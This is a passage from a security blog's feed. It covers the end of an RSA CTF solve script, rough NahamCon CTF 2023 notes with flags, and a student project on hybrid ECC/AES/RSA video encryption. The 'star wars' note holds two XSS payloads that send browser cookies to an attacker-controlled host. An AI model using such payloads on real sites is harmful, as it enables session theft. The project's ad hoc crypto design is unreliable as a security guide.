&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;primes_arr:
&lt;&#x2F;span&gt;&lt;span&gt;        n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*= &lt;&#x2F;span&gt;&lt;span&gt;j
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Calculate totient &amp;#39;Phi(n)&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;    phi &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;k &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;primes_arr:
&lt;&#x2F;span&gt;&lt;span&gt;        phi &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*= &lt;&#x2F;span&gt;&lt;span&gt;(k &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Read the public key from the &amp;quot;public.pem&amp;quot; file
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;public.pem&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;rb&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;pub_file:
&lt;&#x2F;span&gt;&lt;span&gt;        rsa_key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;RSA&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;import_key&lt;&#x2F;span&gt;&lt;span&gt;(pub_file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Extract the values of e and n from the RSA key
&lt;&#x2F;span&gt;&lt;span&gt;    e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;rsa_key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;e
&lt;&#x2F;span&gt;&lt;span&gt;    n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;rsa_key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;n
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Calculate private key &amp;#39;d&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;    d &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;phi)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;flag.txt&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;rb&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;flag_file:
&lt;&#x2F;span&gt;&lt;span&gt;        flag_data &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;flag_file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    _enc &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from_bytes&lt;&#x2F;span&gt;&lt;span&gt;(flag_data&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;little&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;   
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# decrypt flag
&lt;&#x2F;span&gt;&lt;span&gt;    flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(_enc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;n)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;long_to_bytes&lt;&#x2F;span&gt;&lt;span&gt;(flag))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# b&amp;#39;CTF{C0nGr@tz_RiV35t_5h4MiR_nD_Ad13MaN_W0ulD_b_h@pPy}&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : CTF{C0nGr@tz_RiV35t_5h4MiR_nD_Ad13MaN_W0ulD_b_h@pPy}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;Reference : &lt;a href=&quot;https:&#x2F;&#x2F;teamrocketist.github.io&#x2F;2019&#x2F;03&#x2F;31&#x2F;Crypto-VolgaCtf2019-LG&#x2F;&quot; target=_blank&gt;https:&#x2F;&#x2F;teamrocketist.github.io&#x2F;2019&#x2F;03&#x2F;31&#x2F;Crypto-VolgaCtf2019-LG&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Nahamcon CTF 2023</title>
        <published>2023-06-19T00:00:00+00:00</published>
        <updated>2023-06-19T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/nahamconctf23/"/>
        <id>https://themj0ln1r.github.io/writeups/nahamconctf23/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/nahamconctf23/">&lt;p&gt;Hello all!
I played &lt;a href= &quot;https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;2023&quot; target=_blank&gt;NahamCon CTF 2023&lt;&#x2F;a&gt; which was happened from  16 June to 18 June.&lt;&#x2F;p&gt;
&lt;p&gt;I solved 10+ challs, A bit busy to write crear writeups, See you again...&lt;&#x2F;p&gt;
&lt;p&gt;Dirty writeup.txt used during CTF&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;Blur Glasses
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	flag¬Ω‚Çß8084e4530cf649814456f2a291eb81e9¬Ω‚Äï
&lt;&#x2F;span&gt;&lt;span&gt;	flag{8084e4530cf649814456f2a291eb81e9}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Ninety One
&lt;&#x2F;span&gt;&lt;span&gt;	
&lt;&#x2F;span&gt;&lt;span&gt;	Base 91
&lt;&#x2F;span&gt;&lt;span&gt;	flag{dfb88c7d9ca38e71dc27e1072fc43d1b}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;blobber 
&lt;&#x2F;span&gt;&lt;span&gt;	solv.py
&lt;&#x2F;span&gt;&lt;span&gt;	Tlag{b93a6292f3491c8e2 f6cdb3addb5 f588}
&lt;&#x2F;span&gt;&lt;span&gt;	flag{b93a6292f3491c8e2f6cdb3addb5f588}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;RSAintro
&lt;&#x2F;span&gt;&lt;span&gt;	solve.py
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;disinfect
&lt;&#x2F;span&gt;&lt;span&gt;	solv.py
&lt;&#x2F;span&gt;&lt;span&gt;	flag{b00acdc78749b378f8f4889f8243789304abe928}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Open Sesame
&lt;&#x2F;span&gt;&lt;span&gt;	flag{85605e34d3d2623866c57843a0d2c4da}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;jom 
&lt;&#x2F;span&gt;&lt;span&gt;	flag{aad9ba9b3fdfa4cc6f7e2e18d0dcbbab}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;JNInjaspeak
&lt;&#x2F;span&gt;&lt;span&gt;	strings
&lt;&#x2F;span&gt;&lt;span&gt;	flag{1f539e4a706e6181dae9db3fad6a78f1}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;star wars
&lt;&#x2F;span&gt;&lt;span&gt;	0.tcp.in.ngrok.io:19073
&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;script&amp;gt;var i=new Image(); i.src=&amp;quot;http:&#x2F;&#x2F;10.10.14.8&#x2F;?cookie=&amp;quot;+btoa(document.cookie);&amp;lt;&#x2F;script&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;script&amp;gt;var i=new Image(); i.src=&amp;quot;https:&#x2F;&#x2F;16c1-103-225-13-242.ngrok-free.app?cookie=&amp;quot;+btoa(document.cookie);&amp;lt;&#x2F;script&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;OSINT 2
&lt;&#x2F;span&gt;&lt;span&gt;	Medicean fortress, Portoferraio
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	https:&#x2F;&#x2F;www.google.com&#x2F;maps&#x2F;@42.812475,10.3262776,3a,75y,34.04h,87.18t&#x2F;data=!3m8!1e1!3m6!1sAF1QipMRS4U4f6Q44jxZgF8m04lvq6lcm4aiEScSDmoE!2e10!3e11!6shttps:%2F%2Flh5.googleusercontent.com%2Fp%2FAF1QipMRS4U4f6Q44jxZgF8m04lvq6lcm4aiEScSDmoE%3Dw203-h100-k-no-pi-0.46432817-ya247.71796-ro2.4712446-fo100!7i7680!8i3840?entry=ttu
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	flag{e54fcc18854f0adfdedf22120c346b3a}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;OSINT - 3
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	https:&#x2F;&#x2F;www.google.com&#x2F;maps&#x2F;@40.77165,-73.9758633,3a,75y,198.83h,91.99t&#x2F;data=!3m8!1e1!3m6!1sAF1QipM4LLrW5CMXbY9Sjfw1fMoL4BeanJ58aABFfdt9!2e10!3e11!6shttps:%2F%2Flh5.googleusercontent.com%2Fp%2FAF1QipM4LLrW5CMXbY9Sjfw1fMoL4BeanJ58aABFfdt9%3Dw203-h100-k-no-pi-0-ya168.96263-ro-0-fo100!7i8704!8i4352?entry=ttu
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;OSINT - 4
&lt;&#x2F;span&gt;&lt;span&gt;	Schloss Ebenfurth
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	https:&#x2F;&#x2F;www.google.com&#x2F;maps&#x2F;@47.877623,16.36251,3a,75y,268.04h,78.87t&#x2F;data=!3m8!1e1!3m6!1sAF1QipM-qSFbaE1r_waaZ7aay0NHN6NLwUf8-lVJtgxA!2e10!3e11!6shttps:%2F%2Flh5.googleusercontent.com%2Fp%2FAF1QipM-qSFbaE1r_waaZ7aay0NHN6NLwUf8-lVJtgxA%3Dw203-h100-k-no-pi-10-ya160-ro0-fo100!7i8192!8i4096?entry=ttu
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Novel Cryptography Technique for Video Encryption</title>
        <published>2023-06-13T00:00:00+00:00</published>
        <updated>2023-06-13T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/projects/novelcryptographyproject/"/>
        <id>https://themj0ln1r.github.io/projects/novelcryptographyproject/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/projects/novelcryptographyproject/">&lt;p&gt;Hello guys!&lt;&#x2F;p&gt;
&lt;p&gt;Long time no see with the projects..? And now back again with a cryptography based project (excited)..&lt;&#x2F;p&gt;
&lt;p&gt;This project is a combination of multiple trending technologies,&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Hybrid Cryptography, Multikey Cryptography, Video Communication, Real-time Streaming, Elliptic Curve Cryptography (ECC), AES Encryption, Client-Server Model, Socket Programming, Flask, SQLAlchemy, RSA, Key Generation&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Interesting..? Lets me give a breif introduction about this project.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;a-novel-hybrid-multikey-cryptography-technique-for-video-communication-with-client-server-model&quot;&gt;A Novel Hybrid Multikey Cryptography Technique for Video Communication with Client-Server Model&lt;&#x2F;h1&gt;
&lt;p&gt;Protecting copyright and preventing piracy has become a crucial concern in real-time video streaming systems. This research project presents a revolutionary multi-key and hybrid cryptography approach to provide enhanced security for video communication.&lt;&#x2F;p&gt;
&lt;p&gt;The project implements a software solution for video encryption and decryption using a continuous system based on the Elliptic Curve Cryptography (ECC) approach as pseudorandom encryption key generators. This approach generates multiple keys to encrypt and decrypt small chunks of video files dynamically, based on the video data. The implementation follows a client-server model utilizing socket programming.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;video-walkthrough&quot;&gt;Video Walkthrough&lt;&#x2F;h3&gt;
&lt;video width=&quot;100%&quot; height=&quot;100%&quot; controls&gt;
  &lt;source src=&quot;&#x2F;assets&#x2F;files&#x2F;project_files&#x2F;novel-cryptography&#x2F;demo.mp4&quot; type=&quot;video&#x2F;mp4&quot;&gt;
  Your browser does not support the video tag
&lt;&#x2F;video&gt;
&lt;h2 id=&quot;project-flow&quot;&gt;Project Flow&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;User Registration&lt;&#x2F;p&gt;
&lt;p&gt;Here users input their email, password, MAC address, and import their public key on a Flask-developed web page. User data, including the public key, is securely stored in a SQLAlchemy database for future authentication and authorization.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;User Login and Dashboard&lt;&#x2F;p&gt;
&lt;p&gt;Here Users login using their credentials, upon successful login, the dashboard displays video thumbnails, and provides a download button to obtain the client software for connecting to the streaming server.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Server Side Key Generation&lt;&#x2F;p&gt;
&lt;p&gt;The keys which are used to encrypt the video chunks are generated from the ECC equation.  First AES key is generated from the ECC equation which involves Video ID, remaining keys will be generated from the ECC equation which includes the previous key.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Video Encryption at Server Side&lt;&#x2F;p&gt;
&lt;p&gt;The encryption is done for the each video chunk individually. The 0th indexed chunk will be encrypted using the RSA with the receivers public key. The 1st indexed video chunk will be encrypted with the AES using the key generated from the ECC equation which involves VID, remaining chunks will be encrypted with AES and the keys generated from ECC equation which includes previously generated ECC key.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Sending Encrypted Video through Sockets&lt;&#x2F;p&gt;
&lt;p&gt;Encrypted video is transmitted over sockets using the client-server model. The video data is encrypted on the server side using a hybrid multikey cryptography technique and sent securely to the client for decryption, ensuring confidentiality during transmission.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Receiving Encrypted Video through Sockets&lt;&#x2F;p&gt;
&lt;p&gt;Encrypted video is received through sockets in the hybrid multikey cryptography technique. The server receives the encrypted video data, which is then decrypted using the shared session key, ensuring confidentiality and enabling playback or further processing of the video content.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Client Execution&lt;&#x2F;p&gt;
&lt;p&gt;During Client Execution, users run the client.py script on their local machine. The server requests the user to provide their email and password for verification. If the credentials entered match the ones used during registration, the server grants access and presents the user with a list of available videos.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Additional Authentication&lt;&#x2F;p&gt;
&lt;p&gt;In addition to the login credentials, users are prompted to enter their MAC address during authentication. This additional step helps to enhance security by verifying the user&#x27;s identity and ensuring that the device they are using is authorized for access.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Private Key Import&lt;&#x2F;p&gt;
&lt;p&gt;In order to decrypt a received video from the server, the user is prompted to provide the path to their private key. This private key is necessary to unlock the encryption applied to the video. By importing the private key, the user can authenticate themselves and gain access to the encrypted content, enabling them to view the video in its¬†original¬†form.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Key Generation at client&lt;&#x2F;p&gt;
&lt;p&gt;The keys will be generated in the same way they generated at the server side during the encryption.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Video Decryption and Playback:&lt;&#x2F;p&gt;
&lt;p&gt;The video will be decrypted if the private key and MAC address of the user is reasonable. Once decrypted, the video is rendered and displayed by a media player, allowing users to watch it without significant delays or interruptions. This encryption and playback process safeguards copyrighted material and maintains content security¬†and¬†integrity..&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;encryption-flow&quot;&gt;Encryption Flow&lt;&#x2F;h2&gt;
&lt;p&gt;The video file encrypion flow as follows.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;1. Input video file Vinput
&lt;&#x2F;span&gt;&lt;span&gt;2. Generate video chunks Vci from Vinput
&lt;&#x2F;span&gt;&lt;span&gt;3. Fetch the receiver&amp;#39;s public key of the RPkey
&lt;&#x2F;span&gt;&lt;span&gt;4. Collect receiver&amp;#39;s MAC address Rmac
&lt;&#x2F;span&gt;&lt;span&gt;5. Generate VID using Vc0
&lt;&#x2F;span&gt;&lt;span&gt;6. Store VID in a temporary file
&lt;&#x2F;span&gt;&lt;span&gt;7. Encrypt Vc0 using RSA
&lt;&#x2F;span&gt;&lt;span&gt;8. Generate Keya ‚Üê x^3 + VID * x + Rmac
&lt;&#x2F;span&gt;&lt;span&gt;9. Encrypt Vc1 using Keya and AES
&lt;&#x2F;span&gt;&lt;span&gt;10. for i := 2 to n do
&lt;&#x2F;span&gt;&lt;span&gt;11.    Generate Keya ‚Üê x^3 + Keya * x + Rmac
&lt;&#x2F;span&gt;&lt;span&gt;12.    Encrypt Vci using Keya and AES
&lt;&#x2F;span&gt;&lt;span&gt;13. end for
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;internal-processes&quot;&gt;Internal Processes:&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;User Registration:
&lt;ul&gt;
&lt;li&gt;During registration, users are required to import their public key, along with their email, password, and MAC address.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Encryption&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;files&#x2F;project_files&#x2F;novel-cryptography&#x2F;video_encryption.jpg&quot; alt=&quot;Video Encryption&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The server-side encryption involves AES encryption of each 1MB chunk of the video file.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;files&#x2F;project_files&#x2F;novel-cryptography&#x2F;keygeneration.jpg&quot; alt=&quot;keygeneration&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The encryption key used for AES is generated using a novel key generation technique that combines RSA and ECC.&lt;&#x2F;li&gt;
&lt;li&gt;Decryption
&lt;ul&gt;
&lt;li&gt;The decryption was done at the client side same key generation was used here.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;analysis-of-results&quot;&gt;Analysis of Results&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;time-to-generate-keys&quot;&gt;Time to generate keys&lt;&#x2F;h3&gt;
&lt;p&gt;To determine the impact of the multi-key in the encryption and decryption process, the time required to generate the key was calculated in this experiment. The method and equation used to derive the keys are the same for both encryption and
decryption. So, for the sake of analysis, the delay calculated for encryption has been employed in this part. The receiver‚Äôs public key and partial video data serve as the basis for the key used to encrypt the first video chunk. The remaining keys are obtained using the receiver‚Äôs MAC address, public key, and previously computed key. Since the length of the parameters is consistent during this procedure, the time between each key does not vary much.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;time-to-encrypt-video-chunks&quot;&gt;Time to encrypt video chunks&lt;&#x2F;h3&gt;
&lt;p&gt;This section has talked about how long it takes to encrypt each chunk. Although the video processing modules split the video file into chunks for each full frame, the implementation assumes the chunk size to be 1 MB. The video chunks are fed into the AES module before being transmitted. The chunks are mostly the same in that it varies between 1MB and 1.2MB, and the time taken to encrypt each also varies between 0.9 sec to 1.2 sec.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;number-of-keys-generated&quot;&gt;Number of keys generated&lt;&#x2F;h3&gt;
&lt;p&gt;The number of keys generated depends on the quantity of generated video chunks. This statistic has been considered for the study because the suggested solution uses multiple key technologies to provide improved security. Multiple keys have no impact on memory use because the keys are only momentarily saved at the transmitter and receiver sides. Furthermore, because each key is only utilized once, an increase in the number of keys has no impact on the fetching delay.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;installing-entire-project&quot;&gt;Installing Entire Project&lt;&#x2F;h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;git clone https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;novel-cryptography-project.git&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;cd novel-cryptography-project&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;python3 -m venv env&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;source env&#x2F;bin&#x2F;activate&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;pip3 install -r requirements.txt&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;Now you are set to run this project&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Move to Flask_App directory run the &lt;code&gt;app.py&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Visit your localhost to view the webpage on action&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Register an account on the webpage&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Start the &lt;code&gt;server.py&lt;&#x2F;code&gt; and run the &lt;code&gt;client.py&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Input the required data in the &lt;code&gt;client.py&lt;&#x2F;code&gt; console&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Import your private to play the video&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;references&quot;&gt;References&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;Project Guided By &lt;a href=&quot;https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;kumar-anurupam-a3464037&#x2F;&quot;&gt;Sir, Kumar Anurupam&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Research paper published by &lt;a href=&quot;https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;rkmundugar&#x2F;&quot;&gt;Sir. M. Ramakrishna&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Cryptography knowledge by &lt;a href=&quot;https:&#x2F;&#x2F;www.crypto-textbook.com&#x2F;&quot;&gt;Prof.Christof paar&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Socket Programming tutorial by &lt;a href=&quot;https:&#x2F;&#x2F;realpython.com&#x2F;python-sockets&#x2F;&quot;&gt;Real Python&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
